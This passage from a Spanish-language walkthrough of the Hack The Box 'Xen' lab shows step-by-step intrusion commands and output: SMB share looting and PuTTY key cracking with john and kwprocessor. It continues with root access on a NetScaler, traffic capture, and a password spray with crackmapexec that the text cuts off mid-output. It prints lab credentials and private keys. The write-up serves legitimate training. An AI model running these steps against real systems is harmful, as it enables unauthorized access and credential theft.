+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">ISOs-TEST
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">smbclient</code> de <code class="language-plaintext highlighter-rouge">impacket</code> nos conectamos al recurso <code class="language-plaintext highlighter-rouge">Citrix$</code> donde podemos ver varios archivos, 2 con archivos extension <code class="language-plaintext highlighter-rouge">pdf</code>, 1 archivo <code class="language-plaintext highlighter-rouge">ppk</code> y la <code class="language-plaintext highlighter-rouge">flag.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-smbclient htb.local/mturner:</span><span class="am">'4install!'</span><span class="p">@172.16.249.201  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+Citrix$
+IPC$
+ISOs
+ISOs-TEST
+# use Citrix$
+# ls
+drw-rw-rw-          0  Wed May  8 18:12:51 2019 .
+drw-rw-rw-          0  Wed May  8 18:12:51 2019 ..
+-rw-rw-rw-     997001  Wed Feb 13 18:33:28 2019 Deploying-XenServer-5.6.pdf
+-rw-rw-rw-         20  Sun Mar 31 11:25:29 2019 flag.txt
+-rw-rw-rw-       1486  Wed May  8 18:22:10 2019 private.ppk
+-rw-rw-rw-    1747587  Sun Mar 31 11:25:46 2019 XenServer-5-6-SHG.pdf
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Descargamos todos los archivos usando <code class="language-plaintext highlighter-rouge">get</code>, ahora salimos y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"># get Deploying-XenServer-5.6.pdf  
+# get flag.txt
+# get private.ppk
+# get XenServer-5-6-SHG.pdf
+# exit
+
+</span><span class="ve">❯ cat </span><span class="p">flag.txt
+XEN{l364cy_5pn5_ftw}</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">Camouflage</h3>
+<h4 class="post-title">XEN{bu7_ld4p5_15_4_h455l3}</h4><br>
+
+<p class="plain-text">De antes sabiamos que habia una máquina <code class="language-plaintext highlighter-rouge">linux</code> la cual correspondia a la <code class="language-plaintext highlighter-rouge">.202</code>, al escanear sus puertos con <code class="language-plaintext highlighter-rouge">nmap</code> encontramos un servicio <code class="language-plaintext highlighter-rouge">ssh</code> y un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q nmap -sT -T5 -n -Pn 172.16.249.202  
+Nmap scan report for 172.16.249.202
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+3011/tcp open  trusted-web</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrirla la página <code class="language-plaintext highlighter-rouge">web</code> en el navegador pasando por el <code class="language-plaintext highlighter-rouge">proxy</code> corriendo en el puerto <code class="language-plaintext highlighter-rouge">1080</code> encontramos un simple panel de <code class="language-plaintext highlighter-rouge">login</code> de <code class="language-plaintext highlighter-rouge">Citrix NetScaler</code></p>
+<a href="/endgames/xen/11.png" target="_blank"><div><p><img src="/endgames/xen/11.png"></p></div></a>
+
+<p class="plain-text">De nuevo podemos reutilizar las <code class="language-plaintext highlighter-rouge">credenciales</code> de <code class="language-plaintext highlighter-rouge">pmorgan</code> ya que son válidas</p>
+<a href="/endgames/xen/12.png" target="_blank"><div><p><img src="/endgames/xen/12.png"></p></div></a>
+
+<p class="plain-text">Al hacerlo <code class="language-plaintext highlighter-rouge">accedemos</code> a lo que parece un <code class="language-plaintext highlighter-rouge">dashboard</code> de usuario, despues de buscar en la web nos damos cuenta que no hay nada realmente <code class="language-plaintext highlighter-rouge">interesante</code> para nosotros</p>
+<a href="/endgames/xen/13.png" target="_blank"><div><p><img src="/endgames/xen/13.png"></p></div></a>
+
+<p class="plain-text">Tenemos <code class="language-plaintext highlighter-rouge">credenciales</code> válidas, en este caso las del usuario <code class="language-plaintext highlighter-rouge">mturner</code> que hemos encontrado antes son válidas para el login de <code class="language-plaintext highlighter-rouge">ssh</code>, aunque no nos da una <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q ssh mturner@172.16.249.202
+###############################################################################
+#                                                                             #
+#        WARNING: Access to this system is for authorized users only          #
+#         Disconnect IMMEDIATELY if you are not an authorized user!           #
+#                                                                             #
+###############################################################################  
+
+(mturner@172.16.249.202) Password: 4install!
+Last login: Sun Apr 16 01:39:17 2023 from 172.16.249.204
+ Done
+></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Leyendo un poco la <a href="https://developer-docs.citrix.com/projects/netscaler-command-reference/en/12.0/utility/shell/shell/">documentación</a> de NetScaler podemos ver que existe un comando <code class="language-plaintext highlighter-rouge">shell</code> que nos otorgaria una consola pero <code class="language-plaintext highlighter-rouge">mturner</code> no esta autorizado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">> shell
+ERROR: Not authorized to execute this command [shell]
+></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvamos a los archivos que hemos descargado, tenemos uno llamado <code class="language-plaintext highlighter-rouge">private.ppk</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">private.ppk
+PuTTY-User-Key-File-2: ssh-rsa
+Encryption: aes256-cbc
+Comment: imported-openssh-key
+Public-Lines: 6
+AAAAB3NzaC1yc2EAAAADAQABAAABAQDR1rakYMB+9++bNXo/Rda/7dhII8lzQt+n
+ixND2S30rtBz+ROW/UqKqTX8lRZ3zlMFKQT514RomVq0ec6gEoKVGZQRsc+S4aaL
+AAnLp4ENGT3Gk9AeHgDxJ2eyBFnzMmO07gInwFzEPCLTT7caJAYGuMFdxgAsU6BX
+Y49Tv578krpGNz0C58V6YH+u8/AIVXfhmXdwGuY921NDUHogjRGsoxQi9jDffOx+
+zOuxfm7nMRYGDWLZO5HNjhanQt0rj9EK+70zJcFb1CDub9EEmwb/DDZB5zCytx90
+69mql7SFg7D0K1tm0LicrwZMDJuYf87P5MFdBEnsO3Oay1lsRFZz
+Private-Lines: 14
+LbxnKlBkUZLxSGo2vSU375iM6kDpQuIE8S5G+azqGT0FziA/lr40gyj2IipKZqe/
+DZRbPNcrerJQDE9xg1qTqnKShjnRvUi+I5ClTvn7UrYt2HAfds/Tl61zRhJ3YXnu
+dkw3fTfo63OvBPwRpYQtpj5yFbHtUR8wY+2RBNcS/plU2kretGTRbZJkV9+1U7Vz
+Uk2JZfua5VkTuCw7DqKRoAjR28p1UKhpIoztG6MKtNtR1HeUL3y2oQbOzLNJhz0m
+F9sn/wBTdPQN5ZB76ERlH0fAugi7YeuxwFxctnUNoeA3+APH3kzeP9uRLsBwdn0r
+ayZr/yihzFMlQ7VgcjI9uE2sMnScaEk094FWuj6gjPZqoqzAWhXP/71VEWbOg+gj
+s6nBhJB9f4mUEHy8SOlbIK/Q3Es/VAaYiQchSXEsPhHdGC2J511TudjggmCFsCVP
+tf6mzyS+8SA23dE8L3V5S5/Y8IDEcvLWaxDsV6Xjd4PGBgMLp10FJYajo9m61GdB
+4ffBBqI5sOZK0Gb27AemRSyo0vA5EoM3YUOeKqm5xlNIalrTHI10SKD9tTC8UPLJ
+1fbbmJ+eQagw/PefzHQ9cavnU5x98+PjeougVBbkZBGBAqUP0cLV1hWKaOlkqHP5
++m+fLhviWCbNj2FNEFse04NNlbSBgHrF//fVQbFIbSnMsJ/BkDZ5rVxpHG8aq9my
+l9a0d97470iNp8drQKuKGRlzbe/TA8NQQaO5/My28kPbLqLcaTJKNZe8rvvU4Cj4
+n+76s8XHhONvtAUrULiGHyAM2aMQXwUM5rCju7t6hdpy5h8HTgdys35MRM2DdvtD
++SfIoAmXu1V1xQrQJbDlStVM9l5z6C+pzmtv26jXebl8821pI6xJJHW02dZDAskl  
+Private-MAC: 27a161c329fc67b51d27efcaf3221099748934a9</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">puttygen</code> en teoria deberiamos poder generar una clave <code class="language-plaintext highlighter-rouge">privada</code> pero rsa de <code class="language-plaintext highlighter-rouge">ssh</code>, al hacerlo nos pide una <code class="language-plaintext highlighter-rouge">contraseña</code> ya que la clave <code class="language-plaintext highlighter-rouge">putty</code> esta cifrada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ puttygen </span><span class="p">private.ppk -O private-openssh -o private.key  
+Enter passphrase to load key:
+puttygen: error loading `private.ppk': wrong passphrase</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener la contraseña con <code class="language-plaintext highlighter-rouge">putty2john</code> generamos un <code class="language-plaintext highlighter-rouge">hash</code> para john el cual al intentarlo crackear con el <code class="language-plaintext highlighter-rouge">rockyou.txt</code> no conseguimos romper por fuerza bruta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ putty2john </span><span class="p">private.ppk > hash
+
+</span><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PuTTY, Private Key (RSA/DSA/ECDSA/ED25519) [SHA1/AES 32/64])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar <a href="https://github.com/hashcat/kwprocessor">kwprocessor</a> para crear un <code class="language-plaintext highlighter-rouge">diccionario</code> que se base en mapas y <code class="language-plaintext highlighter-rouge">patrones</code> de ruta del <code class="language-plaintext highlighter-rouge">teclado</code> en este caso utilizando la distribución <code class="language-plaintext highlighter-rouge">ingles</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./kwp </span><span class="p">basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > passwords.txt  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al probar fuerza bruta con el <code class="language-plaintext highlighter-rouge">diccionario</code> generado por <code class="language-plaintext highlighter-rouge">kwprocessor</code>, <code class="language-plaintext highlighter-rouge">john</code> logra romper el <code class="language-plaintext highlighter-rouge">hash</code> de la clave <code class="language-plaintext highlighter-rouge">putty</code> y podemos ver la contraseña en texto claro</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:passwords.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PuTTY, Private Key (RSA/DSA/ECDSA/ED25519) [SHA1/AES 32/64])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">=-09876567890-=- </span><span class="p">(</span><span class="am">private</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usando <code class="language-plaintext highlighter-rouge">puttygen</code> podemos generar la clave <code class="language-plaintext highlighter-rouge">ssh-rsa</code> y guardarla como <code class="language-plaintext highlighter-rouge">private.key</code>, sin embargo es una clave <code class="language-plaintext highlighter-rouge">cifrada</code> y nos pedira la <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ puttygen </span><span class="p">private.ppk -O private-openssh -o private.key  
+Enter passphrase to load key: =-09876567890-=-
+
+</span><span class="ve">❯ cat </span><span class="p">private.key 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,BDD46DBFD4AD749C
+
+4yyyT+aTaYhDqaYUKEu5wcaUEUM4N5GWWzyIrQ7WNZNCBaZ2pEspcWGg3k+/qVjw
+Qbdl3d6X87lFWYmj1fREzNL15ZazeBWqkKtGzhDkoIbFb4dX0Grn2c0gO0Qn50dh
+OrBVUP8tYehOAkgszpfKEWeZzbh6ohQRmQnDYhoVHKvmXhE8bHUlVGikdLY8cXhD
+AN7e5bGze06vpzlkYXgcGyUek4WFLMBaYTIpqvk18Qz1iRIuqqNzfr6xsxxsuNLg
+qyDV64+4jDR1yxLDbH0Ht7B8EIHf4yv7Tt6E+TSDntD5vDw1tBxA0RuqQk1Cot+N
+4XaqWk2eemM2MnyTPTqOUtKRgddlx1nwGlj4ntz3Mbpzjoy2eV6AzhznekE72WLp
+MGHTGFELU175nEc/hyGHu++VFWvSAu1kJ4PhfVRCR02iYfGK9LqcOJ+IIRvXUzlI
+hbNXO/l/k9vk+QeuHR9g3hUs56MxBV22HXkchR8o/jEEBVy2ZkGaec5MTsBKqU+M
+8XWqPxZ+hKim+bbycu6Cumdxcc7C2saxpciSQHvGsPGTEXrnu3WfvuCWu8mTJnn5
+jXT+zslZO8Wc6tPKkwAf3ZsftrH98Qmxocob5jhgvM4bATBnUcnQ3bLedtKCICr1
+Y0ZiCZrSyWv/asStw3d3sxqcWoPGu0XXSomVQcGHXAUzShue6FPnPMbP3zWVo+Zn
+0Qcar4YKaGkRWQiCydc1g0CUGUdCltcw4fYsa3a7mJfvrCsq0U/AquvDawJ93B9B
+HGvFEdAxEiBi3bpnD8vWE2oHkAk/4YZ9NYp5cw1xI93o7gPhOCLi4N+MhS35LapU
+S01MqDkGhkDw/DndpSBKebQ+lhyDOMRDSiHtPVf5a2iVharJ9wIbIAaX4OIOBaEc
+fIJxM5SREJfFX28E4ra2sj2d4By2FmATpWVUFnIjFR42T8VqaD5XwkvMQ4YzBBzO
+Jx5+cGvjg2ajkguCEuoq3Giev/sdtV39MZeLmRswRV/JVmT730j/lF6DR34iqvBT
+Dv2LEfqyqcGktYlHb5oK7x9YPO1lRdlExUl7ObdWe3xsnpFh5UUmoPD6SfJ78mY5
+MpHF09B6nnj7vDgbkinIfdIV3pRMEVPk7JuKpkkbQ+7KDyLCDriGmFgC1Vk/woIQ
+mhHGkrxWHF2iAjKYsL0JveTCA9IGSoWSB/00QvbZm0gX7Lu4KALtqgQI1IjiCdGQ
+vHvrevRs6/FzHKXtbNqcSKtTvSqKs5x22yLt2y54kEzWuj5Po0KOBBs7F3GXOBbt
+cGb+iA4D3C2SnZ18+5RmpIw7CXuwbtUpjWAUj8ssf3F14Cg8mifYArpiC9OQufqz
+TKMawdcMMbSfeibyqUqm1guzBneNW96OziPMWoW/oKN3K4zRLl+bXl1hQN5xXjii
+mqQMirEXtE9wsHwZOxNe/UqzbBgYS8Iug6PFwI2v8f4xTjSRMgXH7JhjhkF/xIY1
+z303BmJqQ+hlnkbicfCeAktq4CZcInP91lgtAc6Sbm9Pfje9/b2yTq/MPZSrOQd8  
+5GDqSjIziT5tWesljwyAs4KoZNRgakrbD5jJAk97+UoBxR/+kdfyNA==
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos solucionar esto facilmente generando una nueva clave con <code class="language-plaintext highlighter-rouge">openssl</code>, la guardamos como <code class="language-plaintext highlighter-rouge">id_rsa</code>, le pasamos la <code class="language-plaintext highlighter-rouge">contraseña</code> y tenemos una clave normal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ openssl </span><span class="p">rsa -in private.key > id_rsa
+Enter pass phrase for private.key: =-09876567890-=-  
+writing RSA key
+
+</span><span class="ve">❯ cat </span><span class="p">id_rsa    
+-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDR1rakYMB+9++b
+NXo/Rda/7dhII8lzQt+nixND2S30rtBz+ROW/UqKqTX8lRZ3zlMFKQT514RomVq0
+ec6gEoKVGZQRsc+S4aaLAAnLp4ENGT3Gk9AeHgDxJ2eyBFnzMmO07gInwFzEPCLT
+T7caJAYGuMFdxgAsU6BXY49Tv578krpGNz0C58V6YH+u8/AIVXfhmXdwGuY921ND
+UHogjRGsoxQi9jDffOx+zOuxfm7nMRYGDWLZO5HNjhanQt0rj9EK+70zJcFb1CDu
+b9EEmwb/DDZB5zCytx9069mql7SFg7D0K1tm0LicrwZMDJuYf87P5MFdBEnsO3Oa
+y1lsRFZzAgMBAAECggEASI9cnL6wEbeebScy3IpD1h5iuZ9WW7r2J7NZuA5za7a/
+cjrg4Uc47XXRq0PKfycjYhdrFxHFQX419U5hesyrxu8PWocH5hyNQGeE+50ybNsb
+l30pbCCn5rvfiZkjmYsFG11p9WD5MwowaK2Z/ToTs2NTyh9bk/he65kLyMPsMB3U
+Jx2bqsZZmhsxiRfyi7TFx3n7eBL12U8SN/36N1eBJSMq8UanMvP0Ce3R6LpsAngc
+HD33479bSDG/1tzvRD1UbRCBIhIRFcvDOvs07pVHBnE8rGsczkALXBYIBhxg34CV
+NvwWgbYkYMfGKCKINtoT/K3sJgojAAYsmN5lEOmEYQKBgQD1tqOApMAtdekqO612
+e7VWRm2ggGALkwwiissH9Sl1FGGwn+GVdpjcb0Xh5zbTJv5BLCCZwfe+JLEzpk49
+fnOcSxH6sJX2nBw7OQyADmR5GWfqtf/tO7V+2FSZApyKNEqAArO/KtsIjVS+lJxU
+ZxxstKrS0hUN+eDVRcgrPAYcqQKBgQDan5kgbWeYX6/u2k4Al0ZDOLbSArP8nwz2
+8FLQHk+citTrW6kVCBzOC6prqAZxMsQHhex3vLLWLCk6S7TpC23CRF1diTDA1QlV
+Q4mW7y8xhJRsG1NPvXD9/JKBvqMh3m9iJ8nU4HlKUFP9Hani0dbvtcM99QcJCwjk
+m1U3R1OPuwKBgCcoL+40Uxvrinjcgcw78q4JEzdcvfGaQXjPvYNLIowx70+CaySy
+fbHDWdOiUS5dLG+eZKOcMarvlf2xJw7NtAbYP8k/kuZ2Alm9waw2nvRdhB33Ww2n
+UkkgmHq529B6fNThmVuBrN40B6lHbZJVzEXWlNJ8ADb190qFkFyzeBXhAoGBAMcm
+CQP8BRlNWOMYY2OwaWXEnOzzX2dorxOm2ZkRc23jHY+DwKMS78JV6BkHR08Icn9z
+5HMyJiposemTmymKqqIDSpVw6kNODKFp00T1fqT544YS4jJKHEqRMBgWQ14P1KCy
+I+3RyUsDn257/gxLICLeDQs8T/tR3Pj58odXZuwPAoGABxpye3AQbW68nkBFfkRc
+7ajASJccAAZ9NPgc2jNFMWMX2TKapVL1QzL0ExFlrtoBVd5CiEyxmlTaPUDV6pha
+0H3ftlh4tGmFsgmcZ+TZ5x1i/xzypSxcKieov9ufp1W2kVLDu8lghn1t9IS/cP4m  
+jh0vjD4+lmnAXWJ5kRpHa40=
+-----END PRIVATE KEY-----</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo que se nos podria ocurrir es que la <code class="language-plaintext highlighter-rouge">clave rsa</code> privada pertenece al usuario <code class="language-plaintext highlighter-rouge">root</code> y podriamos conectarnos sin <code class="language-plaintext highlighter-rouge">contraseña</code>, sin embargo al intentarlo no funciona</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q ssh root@172.16.249.202 -i id_rsa
+###############################################################################
+#                                                                             #
+#        WARNING: Access to this system is for authorized users only          #
+#         Disconnect IMMEDIATELY if you are not an authorized user!           #
+#                                                                             #
+###############################################################################  
+
+(root@172.16.249.202) Password:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Leyendo mas <a href="https://docs.netscaler.com/en-us/citrix-hardware-platforms/sdx/initial-configuration.html">documentación</a> de NetScaler encontramos que el usuario privilegiado no es root sino <code class="language-plaintext highlighter-rouge">nsroot</code>, nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code> y ahora podemos utilizar <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q ssh nsroot@172.16.249.202 -i id_rsa
+###############################################################################
+#                                                                             #
+#        WARNING: Access to this system is for authorized users only          #
+#         Disconnect IMMEDIATELY if you are not an authorized user!           #
+#                                                                             #
+###############################################################################  
+
+Last login: Tue Apr 25 17:13:15 2023 from 172.16.249.205
+ Done
+> shell
+Copyright (c) 1992-2013 The FreeBSD Project.
+Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994
+        The Regents of the University of California. All rights reserved.
+
+</span><span class="ve">root@netscaler</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(wheel) groups=0(wheel),20(operator)
+</span><span class="ve">root@netscaler</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Somos <code class="language-plaintext highlighter-rouge">root</code>, con <code class="language-plaintext highlighter-rouge">tcpdump</code> podemos interceptar un poco de trafico omitiendo el puerto <code class="language-plaintext highlighter-rouge">22</code> ya que es trafico <code class="language-plaintext highlighter-rouge">ssh</code> que no nos servira de mucho en este caso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@netscaler</span><span class="p">:</span><span class="az">~</span><span class="p"># tcpdump -i 1 -w capture.pcap -s 0 'not port 22'
+tcpdump: listening on 0/1, link-type EN10MB (Ethernet), capture size 65535 bytes  
+^C
+5843 packets captured
+5979 packets received by filter
+0 packets dropped by kernel
+</span><span class="ve">root@netscaler:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aprovechando la conexión <code class="language-plaintext highlighter-rouge">ssh</code> podemos usar <code class="language-plaintext highlighter-rouge">scp</code> para descargar el archivo de <code class="language-plaintext highlighter-rouge">captura</code> y asi analizar todas las <code class="language-plaintext highlighter-rouge">peticiones</code> localmente en nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q scp -i id_rsa nsroot@172.16.249.202:/root/capture.pcap .
+###############################################################################
+#                                                                             #
+#        WARNING: Access to this system is for authorized users only          #
+#         Disconnect IMMEDIATELY if you are not an authorized user!           #
+#                                                                             #
+###############################################################################  
+
+capture.pcap                                      100%  678KB 569.4KB/s   00:01</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir el archivo de captura con <code class="language-plaintext highlighter-rouge">wireshark</code> y filtrar por trafico <code class="language-plaintext highlighter-rouge">http</code> encontramos la primera petición hacia <code class="language-plaintext highlighter-rouge">/login/do</code> que como contraseña esta enviando la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<a href="/endgames/xen/14.png" target="_blank"><div><p><img src="/endgames/xen/14.png"></p></div></a>
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">Doppelgänger</h3>
+<h4 class="post-title">XEN{y_5h4r3d_p@55w0Rd5?}</h4><br>
+
+<p class="plain-text">Filtrando por peticiones <code class="language-plaintext highlighter-rouge">ldap</code> encontramos una petición bajo el OU <code class="language-plaintext highlighter-rouge">Service</code> <code class="language-plaintext highlighter-rouge">Accounts</code> la cual tramita una autenticación usando la contraseña <code class="language-plaintext highlighter-rouge">#S3rvice#@cc</code></p>
+<a href="/endgames/xen/15.png" target="_blank"><div><p><img src="/endgames/xen/15.png"></p></div></a>
+
+<p class="plain-text">Reutilizando las <code class="language-plaintext highlighter-rouge">credenciales</code> de <code class="language-plaintext highlighter-rouge">mturner</code> que conseguimos antes dumpeamos todos los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio, vemos varios usuarios que terminan en <code class="language-plaintext highlighter-rouge">-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb 172.16.249.200 -u mturner -p 4install! --users
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\mturner:4install!
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated domain user(s)
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\netscaler-svc                  badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\test-svc                       badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\backup-svc                     badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\anagy                          badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\cmeller                        badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\fboucher                       badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\rdrew                          badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\urquarti                       badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\rprakash                       badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\app-svc                        badpwdcount: 1 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\mturner                        badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\mssql-svc                      badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\print-svc                      badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\xenserver-svc                  badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\awardel                        badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\pmorgan                        badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\jmendes                        badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\alarsson                       badpwdcount: 0 desc:
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\krbtgt                         badpwdcount: 1 desc: 
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\Guest                          badpwdcount: 1 desc: 
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="am">htb.local\Administrator                  badpwdcount: 0 desc:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La contraseña era para cuentas se <code class="language-plaintext highlighter-rouge">servicio</code> asi que podemos aplicar un <code class="language-plaintext highlighter-rouge">password</code> <code class="language-plaintext highlighter-rouge">spray</code> con todos los usuarios que terminan en <code class="language-plaintext highlighter-rouge">-svc</code>, hay varios usuarios <code class="language-plaintext highlighter-rouge">validos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb 172.16.249.200 -u users.txt -p #S3rvice#@cc --continue-on-success
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\netscaler-svc:#S3rvice#@cc
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ro">[-] </span><span class="p">htb.local\test-svc:#S3rvice#@cc STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\backup-svc:#S3rvice#@cc
